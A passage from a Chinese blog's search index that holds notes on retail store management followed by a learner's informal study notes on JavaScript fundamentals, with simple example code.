零售品牌有生命周期，包括品牌导入期、成长期、成熟期，不同的阶段应该做的事情侧重点有所不同 导入期：形象打造 成长期：多开店（各店有好有坏，通过周转盘活）、抓住高质量的店铺、打造旗舰店 成熟期：放慢脚步，由外转内，做精细化管理 2. 人员精细化管理 店长 协调、细心、销售指导、店铺维护 货品分析能力：读懂报表、找出问题、针对性改进 其他：在店铺的不同阶段，需要的店长不一样，新店需要销售能力强，稳人心；老店需要管理能力强，侧重带团队； 激励 名词： 成交率：成交笔数&#x2F;进店人数 连带率：销售总数量&#x2F;销售小票数量 客单价：每位顾客平均的购货金额 均体：店里的员工平均分配提成 个体：按各自的销售量抽取提成 方式 称谓：形象顾问、连带王（可让员工头脑风暴，选出大家喜欢的） 提成：均体、个体、小组 奖勤罚懒 打造团队凝聚力 建立共同愿景 领导的个人魅力 适当的压力 建立学习型组织 技能培训 货品知识 销售技巧 礼仪规范 3. 促销精细化管理：选对人，做对事，出结果 不同的顾客，不同的促销方式 未买过：侧重推新，吸引注意力 少量买过：侧重打折优惠，实现持续性购买 常客：侧重减价或其他增值服务，过渡到更高级的货品 所有：不以直接销售为目的，旨在强化品牌意识 内部促销，减少库存； 制定促销目的 清理库存 争夺顾客，拓展市场 迅速提高销售量，占领市场份额 拦截对手，保护市场份额 缩短新品上市过程，促进顾客冲动性购买 提升品牌认知和美誉度，带动相关货品市场 促销方案 选定活动对象：主要目的是谁，次要目标是谁，是特定人群，还是所有人群 确定活动主题：淡化销售，突出情感，打动人心（时机：让顾客有空参与；地点：让顾客方便光顾） 促销赠品的3R策略 相关性：应景 获益性：实用 重复性：使用频率高 选择适当的促销方法 新旧款搭配展示 方便跨店调拨和跨区域调拨 折扣转为导购提成，调动导购的积极性（有时候货品单价低，打折对顾客的吸引力并不高，但对导购的激励很高）（打折容易给顾客留下低档货的印象，尽量不打折，客户对品牌的认可是教育出来的） 促销案例 资源整合：跨渠道的客户资源互相引流（目标客户有重叠的渠道） 赞助一些活动，提高曝光率（童装童鞋：学校的运动会、奖学金，书皮） 事件营销（例如雷锋签名纪念） 促销效果的评估 围绕目标来评估 提高品牌知名度和美誉度：问卷调查 提高销量：数据成本利润法，扣减按去年同期预测的销量，使用差额销量来评估促销成果 促销活动结束后，应跟进顾客对促销活动的评价和反应，以便吸取经验，调整下次的促销计划；包括参加促销的顾客类型、顾客的看法和态度，受益情况等 4. 业务管理精细化：目标要分解，结果要量化 制定销售目标 评估市场环境：上行，下行，成长期，高速期，成熟期等 参考往年销售数据 评估店员销售能力 分解年度销售目标 配套促销计划 分解销售任务 大转小，更容易达到 计量单位转变，3000元变10件，心理困难度降低 销售报表 销售日报表 销售月报表 上月销售金额 本月计划销售金额 实际销售金额 月度销售完成率 同比上月增长率 特价货品销售金额 特价货品占销售比例 客流量情况统计 门店成交率 每月畅销货品销售统计 每月滞销货品销售统计 顾客对货品的建议 改进措施 收集不成交的原因：尺寸、材料、色彩、质量、价格等 进店人数、试戴人数、试戴成交率、时间段 其他：注重老客户的营销 工作表现评核书","categories":[{"name":"社科","slug":"社科","permalink":"http://example.com/categories/%E7%A4%BE%E7%A7%91/"}],"tags":[{"name":"管理","slug":"管理","permalink":"http://example.com/tags/%E7%AE%A1%E7%90%86/"}]},{"title":"Javascript 编程精粹","slug":"Javascript 编程精粹","date":"2016-11-23T23:28:00.000Z","updated":"2024-09-22T23:08:41.982Z","comments":true,"path":"2016/11/24/Javascript 编程精粹/","permalink":"http://example.com/2016/11/24/Javascript%20%E7%BC%96%E7%A8%8B%E7%B2%BE%E7%B2%B9/","excerpt":"","text":"基础：值、变量、控制流程 这是一个值的世界； 六种值：数字、字符串、布尔、函数、对象、undefined（未知）； 与或非三种逻辑运算是否即可组成全世界？ 运算符的运算是有顺序的，不一定要全部算完才有答案； 表达式是一段创造值的代码；（程序是用值来表示的世界） 语句是比表达式更大的单位，以分号结束（大多数需要分号结束，少数情况可以不用，但作者强烈建议这么做，不然会变得复杂）； 一个程序由一组语句组成； 一个语句只有发挥改变世界的作用，才是一个成功的语句；这些改变称为副作用； 变量可以捕获值，并拥有值（当然，也可以继续捕获，就像狗熊掰棒子，一次只能拿一个）； 问：可以抓两个吗？看作者意思好像可以，但我觉得应该不可以，不然事情就变得复杂了； 关键字和保留字不能做为变量名（所以，起个好名字很重要）（名字没起好，程序会出错，比如char和class常躺枪）（禁忌列表很长，但没有双单词，所以，起个双单词的应该万无一失）； 在给定的时间存在的变量和变量值的集合，叫做环境；初始环境非空，有一些标准变量，并不是空的（就像房子要能住，好歹需要些基本设施）； 打开新页面，会有新的初始变量；当前页的变量，直到打开新页才会消失；（貌似二者都相当于重新开房，创造了新环境） 环境初始状态里面，有很多值是函数类型的（这样好，省得自己写函数，可以马上拿来用）（注意，函数和对象也是值的一种） &amp;&amp;和||的真正意思：一种能够提供可靠值的简单方式 或：先检查左边，如果左边是true，则返回左边；否则返回右边； 与：先检查左边， 如果左边是false，则返回左边；否则返回右边 函数是包含在值中的一段程序；通常这段程序会执行一些操作，使用包含的函数值调用这段程序；举例：浏览器，alert(“Good Morning”)，称为：变量 alert 拥有一个函数，此函数用于弹出带有消息的小对话框； 问：变量alert拥有一个函数后，是否变成函数alert？它还可以拥有其他函数吗？如果给它重新赋其他函数值的话？是的，变成了一个函数；重新赋值可以变成其他函数； 执行函数里面的代码称为调用或应用（用前面的单词好了，比较常听说），使用括号来完成这一过程； 问：“生成函数值的表达式都可以通过在后面添加括号来执行，尽管通常会直接引用包含该函数的变量” 括号是用来调用函数里面的代码的，即使不需要参数，也需要有空括号？是的，没错； 如果需要有函数值，则将表达式写在括号里面，得到函数值；此时如果函数有代码，则将值做为参数，调用代码进行计算？是的 那么if()是否也可以这么理解呢？还是说if仅仅是语句的语法单词？不对，if后面不接着括号，它只是一个语句，while才有可能是函数，它只有一个参数，是一个条件表达式； 经查询，for循环果然是一个函数，这个函数有三个参数，分别为初始值的赋值表达式，条件表达式的布尔值，递增或递减表达式的结果值； 给函数传递的值，叫形参或者实参（好像通常叫参数）； 函数可能只需要一个参数，也可能需要多个； 思：只做一次运算好像不需要创建函数；只有需要使用相同算法重复运算的时候，创造函数才有价值，就好像axure里面的模板，可以一处定义，处处重复使用； 但通过函数对复杂的运算进行抽象，在一定程度上，也有简化程序的作用，让程序变得更容易理解一些； 理论上可以给任何变量赋一个新值，但这样做很危险（听说也很有用），比如一个变量是函数，然后给它赋值8，它便不再有函数的作用了，变成了一个普通的变量； 有些函数返回的结果是字符串，可以通过Number函数，将字符串转化成数字，例子：Number(prompt(“pick a number”,””))； 问：转化的规则是什么？只有搞清楚规则，才能避免转化出不想要的结果； 条件执行：不希望所有的语句都按顺序执行（有些语句在有些情况下不需要执行，以免浪费资源） 循环：很像一个条件语句，用于让语句执行多次；如果循环体内的表达式产生的布尔值是true，循环就会继续执行，直到出现false（所以在定义循环前，先定义好退出机制很重要） 思：是否可以理解为批量工作？不是，更像是反复工作； 大括号，里面包含一组语句，组成一个代码块，对于外界，这个大括号相当于一个语句； while与do的区别：前者可能不执行语句，如果条件不满足的话；后者至少执行一次语句，然后再判断条件是否满足，以便考虑是否再循环执行； for循环 思：你看，for带了括号，根据函数的定义，好像它即是一个函数，观察了一下while和do，好像也是一样的道理； 函数是包含在值中的一段程序，通常这段程序会执行一些有用的操作，产生一些副作用； （当看到第2章时，发现以下这段理解是错误的） 函数后面的大括号包起来内容，可以视作一条语句（或者叫一块语句），它不是函数的必需品；没有的话，也没有关系，有的话，就会执行；理论上代码块是需要由大括号包括起来的，不过也可以不使用大括号，此时就要做好缩进，以便能够识别语句是属于某个函数的； 思：当不止一条语句的时候，想不使用大括号都不行了，因为有多个分号，无法判断在哪里结束； &#x2F;* *&#x2F;用来表示注释的开始和结束，常用于整块注释；&#x2F;&#x2F;则用于整行注释，后者更简洁，但不适用于块； 如果一个函数没有特别指定返回值，如print和alert函数，则它的返回值会是undefined（这么说，函数一定会返回值咯？是的，会返回值；） 值有6种类型，分别为：number, string, Boolean, object, function, undefined. (但从百度搜索到的一些博客中，分法有些不一样，他们有些将function做为object的一种，同时还新增一种null类型；另外还分出一种引用类型）（事实上，甚至可以理解为，一切皆为对象，number 和 string 也是一种对象，它们是提前内建的对象）； 当想要通过有限小数来表示无限小数的时候，就会存在不精确的情况，此时只能得到近似值，而不是精确值； 5种算术运算符，分别为加减乘除求余数（+，-，*，&#x2F;，%）； 字符串通过单引号‘’或者双引号“”来标记； 当要显示一些特殊符号是，用反斜杠\\来标记；特殊符号有：单引号’，双引号“，换行n，TAB键t，反斜杠自己\\； 运算符有分一元和二元两种： 一元：typeof，-(减号)，！(非)； 二元：+, -, *, &#x2F;, &amp;&amp;, ||, &gt;&#x3D;, &lt;&#x3D;, &lt;, &gt;, &#x3D;&#x3D;, !&#x3D;； 大写字母在Unicode的字符集里面，是小于小写字母的；（不知在utf-8中表现如何？）； 成功的语句需要有改变世界的作用；（比喻有点生动哦） 语句会有副作用，比如改变程序的内部状态以此来影响后面的语句； 应该把变量想象成一个触手，它会不断抓取值，而不是一个盒子，用来容纳值；（所以通过循环语句可以使某个变量不断递增&#x2F;递减或递乘）（变量只是一个插头，通过它，可以按路径导到引用的值） 几乎任何单词都可以做为变量名，除了关键字和保留字； 在给定时间内存在的变量和变量值叫做环境；环境不是空的，它一开始有一些标准变量；浏览器加载一个新页面时会创建一个新环境，关闭一个页面时会关闭一个旧环境； 条件执行：if, switch； while, do, for等3个循环； while：声明，判断，循环或结束； do：与while的差别是，先执行一次后再判断要不要进入循环（do, 如其义，先干一次）； for：大多数情况下，书写起来比while来得简洁和清晰； 跳出循环：break; 更新变量简便法： counter++, counter–；或者counter+&#x3D;1, counter-&#x3D;1, counter*&#x3D;base(等同于counter&#x3D;counter*base)； 注释：单行用&#x2F;&#x2F;，块用&#x2F;* 注释内容*&#x2F;； 不同类型的值进行比较时，会触发类型的自动转换； ||或运算符：a||b, 首先检查左边的a能够转换为布尔值且为true的时候，返回a的值，否则返回b的值； &amp;&amp;与运算符：a&amp;&amp;b, 首先检查左边的a能够转换为布尔值且为false的时候，返回a的值，否则返回b的值； 函数 function用于创建函数，function后面跟的变量名会作为函数的名字；函数名后面的括号()内的内容，是函数的参数；后面大括号则包含着函数体（作者说，与while循环和if语句不同，此处的大括号是必须有的）（if 不是函数，while 不是定义函数，而是调用函数）； 函数体里面的return会使得函数产生返回值，没有表达式会返回undefined，但如果连return都没有呢？（一个不产生返回值的函数，有什么用处没？没有副作用，没有改变世界？）(后面发现没有return也会返回undefined；这么说来，函数的调用必定会返回值；也是吼，这是一个由值组成的世界） 函数参数的作用类似于变量（注意，作者说类似于），其值是由函数的调用者传递的，而不是函数自身传递的（这么说来，函数参数一开始只是一个名字，没有赋予值，要一直等到被调用的时候，才会给参数赋予一个值？）（作者还说，函数还可以像处理普通变量一样，为这些参数赋予新值，即这个值虽然是由调用者传递过来，但在函数内部处理的时候，仍然可以改变参数的值）（在函数内部定义同名变量，将参数值赋给同名变量） 函数的处理时间轴不同，它是优先的；跟位置无关（原因：计算机在执行语句前，会先通过function找到所有定义的函数，然后保存下来） 局部变量包括函数参数和函数内部定义的变量；如果没有定义同名的局部变量，函数可以访问全局变量（先在函数内部寻找，如果没有找到，再到上一级命名空间寻找）； 词法作用域：关于变量的可访问性；对于js，函数是唯一能创建新作用域的地方，大括号是不行的（此处与其他编程语言的处理方式不同，据作者说，新版本的会增加这个功能） 思：函数外面，是否可以访问函数内部的局部变量？据说会尽量保留，叫做闭包特性； 栈：存放上下文的地方 目的：当函数体执行完以后，知道从哪里继续往下运行 原因：跟函数体内部可以再定义函数有关（即嵌套），每次内部嵌套函数的时候，就需要保存上下文；新增加的上下文会存入栈的顶部，先进后出，后进先出；函数返回时，存放在顶部的上下文会被弹出栈被重新获得； 注意：如果栈太大，就会溢出，因为存不下了（例如函数无限循环的情况）； 函数都是值； 如果函数后面的括号（）没有内容，表示此函数不传递参数； 可以用function()创建无名函数； 闭包特性：包裹一些局部变量的一个函数叫做一个闭包； 特点：只要这个局部变量是可达的，就会尽量保存这个局部变量； 可选参数 假设函数只有一个参数，可以多传，但会被忽略，不会出错（所有参数，包括多传的，都可以通过函数内部的默认 arguments 变量进行访问） ； 假设函数有两个参数，可以少传，如果条件判断允许，仍会执行； 好处：函数可以接收可选参数，即传不传进来，可以设置条件让它进行不同的处理； 发明函数的原因是为了代码复用； 最佳的函数是只处理单个简单行为函数（因此，创建复杂嵌套这种类型的，能少用或许更好，除非不得已，没有更好的办法）（简单会降低出错的概率，而且也容易理解） 陷阱：为小功能编辑复杂的框架，考虑各种情况； 措施：在明确自己需要该函数之前，不要自作聪明； function zeroPad(number, width){ var string&#x3D;String(Math.round(number)); while (string.length&lt;width); string&#x3D;”0”+string; return string; }（使用循环是一种方法，但这个循环需要做很多次运算，是否还可以一次性把 0 加足的方法？比如 zeroNeed &#x3D; width - string.length; string &#x3D; “0” * zeroNeed + “string” （这里的乘法运算 python 是支持的，但就不知道 js 是否也支持了） 纯函数： 不产生副作用，返回值只取决于参数，参数相同，结果相同；可以用具体值替代函数，而不会产生任何变化；纯函数比非纯函数的适用范围更广； 如果我们想写的东西能够很自然的用纯函数来表示，就使用纯函数；未来的我们会感谢自己这么做； 如果不能，则也不要觉得编写非纯函数很低级； 递归： 函数通过调用自身，不断向下循环直至得到结果值； 好处：代码简洁优雅 缺点：执行效率差 原则： 只有在证明程序运行太慢时，才去关注效率的问题（原因：计算机最擅长的地方就是运行速度快，要发扬这种长处）； 如果效率高的代码很复杂难懂，而可以考虑编写成简单的递归方式，牺牲一点效率； 不要狂热追求效率，因为对于计算机来说，这种效率的提升只有很小的差别，但却使得代码变得很臃肿，很复杂，错误更多； 数据结构：对象与数组 null和undefined没有属性； 数字和布尔有属性，但据说没有任何意义（好奇是什么属性）（拥有意义的属性的值：字符串、函数）； 函数暂时不知道是否有属性；但函数可以为做为对象的属性，此时它叫做方法；（函数也有属性） 对象实际上是一个属性的集合； 对象的属性可以添加和修改；其他值的属性，如果有的话，是固定的； 属性速记法，对象名称.属性名称（二者用点连接），前提：属性名称是合法名称，即不以数字开头，无空格，无符号； 属性名称可以是任意字符串，不限于合法的变量名； 读取不存在的属性会得到undefined；属性存在，但此属性没有值，读取会得到什么？（可能会得到 null ？此处的情况相当于一个没有赋值的属性，貌似这种情况不可能存在，因为为对象添加属性的同时，需要对其进行赋值） delete用于删除属性（内建属性是 delete 不可删除的）； 用 &#x3D; 等号设定一个不存在的属性，则会添加新属性，例如set.tanGo&#x3D;5； 如果属性值非法，则不能用速记法，而是用中括号[]，并用引号引住非法的属性名称（数字型的属性名称可以不用引号，但用了也没事）； 中括号内可以是任意表达式，中括号会将表达式转化成字符串，再判断对象是否有该字符串对应的属性名称；因此，在括号号内，也可以把变量名称当成属性名称（估计需要小心使用，如果这个变量是有赋值的，此时会出现什么情况？）； 操作符in可以用来判断一个对象是否有某个属性，它产生的是布尔值； 对象即集合：数组；数组是一种特殊的对象，它提供了一些便利； 独立创建的两个对象，即使它们的属性和属性值完全一模一样，都是不同的两个对象；用&#x3D;&#x3D; 比较内容相同的两个对象返回的值是false；（对象之间是不可比较的，它们是不同的实例，即使完全一样，也是不同的实例） 包含函数的属性叫做方法（目测通过方法可以操作对象；由于对象的属性可以随意增删，那么，目测可以自己写一个函数，然后将它做为某对象的属性，从而实现对对象的操作，其实好像就是 delete）（操作可分多种，改变对象的操作，还是不改变对象的操作，如果是不改变对象的操作，想到得某个值，应该也可以将对象做为参数调用函数进行计算）； 字符串的方法：string.charAt（数字），用于返回字符串的第“数字+1”个位置的字符（之所以加1，是因为是从零起算的）； 既然字符串有方法，说明不仅数据和对象才可以使用方法；那数字和函数也有自己的方法没？（函数肯定是有自己的方法的，数字则暂不清楚，所谓的方法，不过就是该属性也恰好为一个函数）（由于一切皆为对象，所以都可以添加自己的办法） string.split(“符号”)：根据符号将字符串分开多小段的方法； string.slice(数字,数字）：提取字符串的两个数字间的字符的方法；如果slice只有一个参数，则表示截取从参数位置开始到整个字符串结束之间的片段；（这个函数可以方便的实现左截和右截） 方法可以用来封装成函数，比如startWith(string, pattern)，这个函数用来判断string是否包含pattern，如果是就返回true，如果不是，就返回false； string.indexOf(“字符”)方法可以用来获得字符在字符串的位置；（如果字符串中有两个相同的字符呢？如果字符是字符串呢？获得的位置是起始还是终止位置？答：是起始位置） new是创建对象值的一种方式，它不是指定所有的属性和值，而是用函数来创建对象（这么说，通常的做法是用非函数也创建对象，直接指定属性和值？对，即使用大括号和分号“{}；”）（与var创建对象有何不同?还有其他创建对象值的方式没？）（听说这种创建函数的标准过程，叫做构造函数）（之所以叫做标准过程，猜测是因为这个创建过程中，直接定义了标准的属性名称，每个名称的位置固定的，数量也是固定的）；（通过构造函数来创建对象，可以实现类的继承效果） 示例：new Date(1980,8,1)； 几个新函数：getFullYear(), getMonth(), getDate(), getDay(), getHours(), getMinutes(), getSeconds(), getTime()（取毫秒数）；这些函数的作用是提取某个存储着日期（时间）值的对象的相关属性，比如date是一个对象，date.getFullYear()的意思是将这个存储着时间的对象中的年份提取出来； catRecord是一个单独的函数，用来创建一些存储对象，在其他情况下它可能也有用处，所以把它单独编写在增删函数的外面；这种对象使用的术语通常是Record，用于聚合一定数量的值； 怎么看这个命名，像是作者自定义的一个函数嘛，至于这个函数是用来干什么的，只有看到函数的详细信息才能够判断了； data[name]和data.name的区别：二者都可以用来表示对象的属性，前者是通用写法，后者是速记法，后者只有在属性名称是合法名称时，才可以生效，为了避免出现意外，比如这个属性名字是外部传入，不可控制，则使用中括号比较稳妥；如果这个属性名称是我们自己内部定义的，则可以使用速记法，比较简便；（前面有问了一个问题，关于中括号内部使用的变量有值怎么办，突然想起区别在于有没有使用引号，如果用了，引号括起来的内容就不再是一个变量了，而变成了一个字符串） 函数Math.min和Math.max揭示了一个本质，Math是一个对象，min和max是Math对象下面的两个属性；对象扮演的另外一个角色：一个位置拥有若干相关的值；（跟前面讲的对象是集合好像是同一个概念的嘛？） 对象的属性是一个函数，也即一个方法，或者也可以理解为这个对象是系列函数的集合；（对象的本质是一系列值的集合，或者叫属性的集合） arguments 变量，参数的数组，但不是真的数组，例如没有push方法，很有用处，它有length属性可以使用；在存在可选参数的情景挺有用，比如参数少于目标数量时应如何处理；向该变量添加属性时，不会自动更新length属性； for(var name in data)意思是遍历一个数组的属性，叫做for in循环；此循环只能返回能够通过对象访问的、可枚举的属性；不可枚举的属性不会返回；因为所有的对象都拥有一些通常的方法，例如toString，为了避免这些带来干扰，就屏蔽隐藏了起来；开发人员自己定义的属性是可枚举，不可隐藏的；（原来可枚举和不可枚举的区别，就在于这些属性是天生的，还是后天的） 错误处理 错误有两种类型 程序员错误 运行时错误：外界输入的存在非法的可能性；（听起来好像可以起个名字叫输入错误） 返回特殊值： 通常在可能出现错误时，应认真检查错误，通过返回一个特殊值来指出错误是最好的方式； 缺点： 例如函数可以返回任意一种值，即我们定义的特殊值，在某些情况下可能是正常值； 如果一个函数调用10次，则需要做10次检查； 如果函数返回特殊值，则调用它的函数也要做值的检查，以便应对返回特殊值的情况，避免出错； 异常处理：如果函数出现异常，应立即停止操作，并跳转到能够处理异常的位置 什么是引发异常的关键字？ 关键字：一些预设的单词，用来表示特定的操作； throw 关键字，当异常发生时，可以使用这个关键字来抛出设定好的异常提示； 什么叫做设置异常障碍？ try 的用途是什么？ 不同的浏览器，报错提示不同，使用 try catch 可以捕获浏览器的报错内容； try：可以让我们执行需要进行测试的代码块 catch：当 try 里面的代码块出现错误时，则执行 catch 里面的代码块； throw：允许我们创建自定义的错误； finally：如果前面的 try 出现异常，finally 里面的代码会被执行，但 finally 后面的代码则不会被执行；如果 前面的 try 没有出现异常，则 finally 的代码执行后，finally 后面的代码会被执行； 其他 什么是脚本语言？ 由于翻译的问题，脚本二字让人感到困惑，事实上，如果使用指令语言代替脚本语言，或许会让事情变得简单一些；脚本的意思，即是一系列指令，这些指令告诉计算机（或叫脚本翻译引擎）要做些什么事情； 重新声明变量时，如果没有赋值的话，不会改变第一次声明变量时的赋值，例如 var carname &#x3D; “Volvo”; var carname； 注：此时的 carname 的值仍然是是 Volvo，而不会变成了 undefined； 创建数组的几种不同方式 方法1 var cars &#x3D; new Array(); cars[0] &#x3D; “Volvo”; cars[1] &#x3D; “Ford”; cars[2] &#x3D; “Toyoto”; 方法2 var cars &#x3D; new Array(“Volvo”, “Ford”, “Toyoto”); 方法3 var cars &#x3D; [“Volvo”, “Ford”, “Toyoto”]; js 的对象是属性的集合，感觉类似于 python 的字典，跟 python 的对象好像不太一样； python 的对象是可以有方法的，不知 js 的对象是否可以？发现也可以，而且，在 js 中，一切均为对象，对象是拥有属性和方法的数据（感觉跟 python 一模一样），例如，对于汽车这种对象： 属性： car.color &#x3D; “white”; car.weight &#x3D; “850kg”; car.model &#x3D; “cc2017”; 方法 car.drive() car.brake() car.start() js 的变量均为对象，当声明了一个新的变量时，即声明了一个新的对象； 声明新变量时，可以用关键字 new 来指定变量的类型，例如 var carname &#x3D; new String; var x &#x3D; new Number; var y &#x3D; new Boolean; var z &#x3D; new Array; var person &#x3D; new Object; 在面向对象的语言中，属性和方法被称为对象的成员；对象有一些内建的方法，例如当我们创建一个字符串变量时，var car &#x3D; “Volvo”；本质上我们是创建了一个字符串类型的对象，这个对象有一些内建的方法，例如：car.length，用来计算字符串的长度；类似的还有 car.indexof(), car.search(), car.replace() 等； 如果把值赋给尚未声明的变量，则该变量会被做为全局变量对待，即使它的位置是在函数内部； 局部变量在函数内部创建，也在函数完毕后删除；局部变量只有在函数内被访问，它不能在函数外面被访问，因此，两个函数拥有相同的局部变量名称是允许的，因为当第二个函数被执行时，前一个函数的变量已经被删除了； 全局变量在网页打开时创建，在网页关闭后删除； 如果把字符串和数字相加，结果会变成字符串； &#x3D;&#x3D;&#x3D; 表示全等的意思，全等是指运算符左右两边的内容，值相同，类型也相同，全部相同； 条件运算，示例： variablename &#x3D; (condition)? value1 : value 2 表示根据条件 condition 进行判断，当条件为 true 时，取 value1；当条件为 false 时，取值 value2； with 函数：用来引用特定对象的属性，好处是可以减少一些代码量，避免重复劳动，示例： 没有使用 with: x &#x3D; Math.cos(3*Math.PI) + Math.sin(Math.LN10) , y &#x3D; Math.tan(14 * Math.E) 使用 with: with(Math){ x &#x3D; cos(3PI) +sin(LN10), y &#x3D; tan(14E) } focus 函数 RegExp 对象 创建一个 RegExp 对象，将需要检索的值做为它的参数，然后通过调用它的方法（有3个），将需要检索的字符串做为方法的参数，然后得到想要的结果（方法的返回值） var patt1 &#x3D; new RegExp(“e”); document.write(patt1.test(“The best things in life are free.”)) 感觉这是一种很奇怪的用法，为什么不直接把它写成函数呢，而要将函数单独封装在一个对象中做为其方法？这两种方式有何区别？如果做为单独的函数，是否单独封装在一个模块中就可以了，需要的使用 import 进行调用？ 三个方法 test()：用于检索目标值是否存在于字符串中，如果有返回 true；如果没有返回 false； exec()：用于检索目标值是否存在于字符串中，如果有返回目标值；如果没有返回 null ； 可以使用第二个参数来设定检索模式，例如 “g” 参数，这个参数的用途是执行 exec() 返回结果后，将记住检索结果的位置，如果再次执行这个方法，会从记住的位置开始往后搜索；这样做的好处是我们可以使用它来完成对一个字符串完整的全局搜索，并返回找到的每一个结果；不过它需要配合循环才能实现； compile()：这个方法用于在不改变变量名称的情况下，替换创建 RegExp 对象时的值参数，例如： patt1 &#x3D; new RegExp(“e”); &#x2F;&#x2F;表示以值 e 作为RegExp 的参数； patt1.compile(“d”); &#x2F;&#x2F;表示将 “e” 替换成 “d”，即变成了 patt1 &#x3D; new RegExp(“d”); 犯过的错误 for 循环忘了加{} innerHTML 写成了 interHTML; 使用变量前忘了先声明； 代码块结束时忘了加 } （考虑在写第一个 { 的时候，就顺便把最后的 } 也一块写好，之后再在中间添加代码块的内容； 有语句中最外层使用双引号时，内层应使用单引号，不然好像无法识别； 将脚本写在 head 里面，和写在 body 里面是有区别的；由于 HTML 是有加载顺序的，如果有一些不需要立即执行的代码，则放在 head 里面不合适；如果有一些代码需要获取某些标签，则代码应该写在标签后面，不然由于标签还没有加载，会获取不到； 在函数的参数中，使用变量的话， 不需要给变量添加引号； 函数名称的大小写是敏感的；例如: slideDown() 和 slidedown() 是不同的； 调用对象的方法，记得在方法名称右侧加括号，例如 killerRabbit.dance()，而不是 killerRabbit.dance 括号表示执行函数体内部的代码； 心得 如果想要在网页上做一些事情，其中的方法之一，是在 html 标签中写一个事件让 js 捕获，然后在 js 中定义一个函数，在函数中写一些动作；调用这个函数，就执行这些写好的动作； 提示框 prompt() 接收两个参数，第一个参数是标题，第二个参数是输入框的默认文本，例如： prompt(“请输入名字：”, “Bill Gates”) setTimeout() 可以用来设置某个时间后要执行的代码，语法：setTimeout(“要执行的 js 代码”, 时间) 注：时间指现在开始，以毫秒计算；例如 1000，表示 1 秒后； 使用 var 和不使用 var 进行变量赋值的区别： 函数体外 使用 var：全局变量，不可删除 不使用 var：全局变量，可删除 函数体内 使用 var：局部变量，作用域外不可访问，作用域内不可删除； 不使用 var：全局变量，可删除； indexof()：用来检索指定字符值在字符串中的位置 对字符值的大小写敏感 如果没有找到，会返回 -1; 第一个参数指要检索的字符值，必选； 第二个参数指要开始检索的位置，可选； escape()： 用来对字符串进行编码，但不会对 ASCII 字母和数字进行编码； 所谓的编码即是将一些符号进行转义，以便在所有的计算机上都可以阅读该字符串； 以下是一些符号不会被转义： 加减乘除：+ - * &#x2F; @ . _ 通过 unescape 可以反转义； substring() 用来提取字符串的片段，作用有类似 slice() 和 substr() substring(3, 7)：提取位置 3 到位置 6 的字符 例如 hello world，会提出：lo w slice(start, end) 用来从数组中提取部分元素组成子数据 end 是可选参数，如果 end 不指定，会提取从 start 开始之后的所有元素； 支持负数的参数，负数表示倒数，比如 -1 表示倒数第1个元素，-2 表示倒数第2个元素； prompt( txt, defaultTxt) 用来显示一个消息提示框，提示用户输入文本 txt 是说明文字，dafaultTxt 是输入文本的默认值，两个参数都是可选的； setDate(d) 用来设置日期对象的月份天 myDate &#x3D; new Date() myDate.setDate(20) 在参数中 getDate 用来获取日期对象的月份天 myDate &#x3D; new Date() myDate.getDate() 如果某个 HTML 元素一开始不想让它显示出来，而是某个事件后，再显示出来，则一开始它的属性 display 可以设置为 none，例如： concat() 作用：它是数组对象的一个方法，用来将参数，连接到当有数组中 示例： arrayA.concat(arrayB, [1, 2, 3], [“a”, “b”, “c”]); js 的对象扮演着两个角色，一个是拥有方法的值，一个是属性集；可以通过编写一个构造函数并指定原型，以便将对象视为一个属性集并进行获取，这个时候，它有点像字典，因为可以使用它进行名称查询；这个字典可以编写四种方法，一个是增加新属性的 store，一个是查询属性的 lookup，一个是立判断属性是否存在的 contains，一个是遍历属性并进行操作的 each；（此处要编写 each 时，需要先编写一个函数 forEachIn 来实现） js 的 for … in 循环中，变量 i 是一个自增的数值； arguments 是一个伪数组，它存储了函数的参数，可以使用 length 和 index 方法，但是没有 push 和 pop 方法； 在 js 中，不需要明确指定的参数名也可以访问参数，例如： arguments[0], arguments[1] 这样； apply 方法和 call 方法类似，只是 apply 函数要求其第二个参数必须是一个数组，而 call 则没有这个要求； 示例：apply(func, [a, b, c]) 示例：call(func, a, b, c) 假设有一个函数和一个对象如下： x &#x3D; 10; function f(){ alert(this.x)}; obj &#x3D; {x: 15}; 当运行 f() 时，函数中的 this 指向的是全局对象，此时刚好定义了一个全局对象下的变量x，因此代码可以运行，并显示值 10; 当运行 f.apply(obj) 时，此时函数中的 this 不再指向全局对象，而是指向了 obj 对象，因此，它相当于 obj 多出了一个方法 f()，类似如下代码： obj.f &#x3D; function(){alert(this.x)}; apply 和 call 有一个非常重要的点，它可以改变函数动作的作用域；这一点非常重要，它使得 this 在不同环境中，可以指代到想要指代到想要指代的对象，而不会受环境影响； 关于类与继承的实现 this this 总是依据运行环境而定，而不是在函数定义时决定；在不同的运行环境中，this 代表不同的东西； 在全局环境下，this 代表 window 定义全局变量，等同于定义 window 的一个属性； prototype 每个构造函数都有一个默认的 prototype 属性； 这个 prototype 指向一个对象，它是当前构造函数的原型； 构造函数创建的对象，基于这个原型进行创建； 我们可以给这个原型添加一些方法（相当于给原型对象添加属性）； 这样使用构造函数创建出来的对象，也会继承拥有这些方法； constructor 对象的 constructor 属性始终指向创建当前对象的构造函数； 实现方式一：原型由对象描述，create 和 extend 将原型放到一个对象中，成为基类；然后通过 create 方法实现类的实例化，通过 extend 的方法来实现子类的创建； 优点：可以忽略 prototype 的使用（或许应该理解为封装起来了？） 实现方式二：构造函数，inherit 和 method，new 和 prototype 使用构造函数，并在对象上定义 inherit 和 method 方法；通过 new 来实现类的实例化（创建对象）； 继承的使用，最终目的是想要提高效率，减少一些重复代码的编写，所以应该避免陷入为了继承而继承的陷阱，专注于让代码能够正常运行，并且真正实现减少工作量才是本质； 为了避免使用全局变量，有两个办法 办法一：设计一个函数，并将函数内的方法添加到全局对象 window 上（这种方法虽然可以避免全局变量，可以却难免要应对全局对象上的方法的命名冲突） 办法二：设计一个对象，对象里面存着变量和方法，但它不直接通过定义获得（不然会变成全局变量），而是通过定义匿名函数并马上运行它来返回所需要的对象 正则表达式 search match replace：两种用法 用法一：可以使用 $1 到 $9 来代表寻找到的匹配值 var names &#x3D; “Picaso, Pablo\\nGauuin, Paul\\nVan Goth, Vincent\\n” names.replace(&#x2F;([\\w]+),([\\w]+)&#x2F;g, “$2 $1”); 用法二：通过将函数做为参数，对每一个寻找到的匹配值进行处理 “the cia and fbi”.replace(&#x2F;\\b(cia|fbi)\\b&#x2F;g, function(str){ return str.toUpperCase(); }); 原理：每次找到匹配的值，参数函数就会被调用一次，匹配值就会被参数的返回值替换掉；传给该函数的参数是成功匹配的元素，它与 match 